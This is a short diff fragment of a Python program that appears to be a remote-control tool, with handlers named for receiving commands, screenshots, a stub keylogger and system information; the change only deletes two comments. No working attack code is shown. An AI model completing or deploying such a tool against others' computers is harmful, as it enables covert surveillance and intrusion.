@@ -24,7 +24,7 @@ def reliable_recv():
             continue
 
 def parse_command(command):
-    # Parse command and arguments
+    
     parsed_command = command.split(' ')
     return parsed_command[0], parsed_command[1:]
 
@@ -87,7 +87,7 @@ def handle_screenshot(arguments):
             count += 1
 
 def handle_keylog_start(arguments):
-    pass  # Placeholder for keylogger functionality
+    pass  
 
 def handle_sysinfo(arguments):
     sysinfo = {
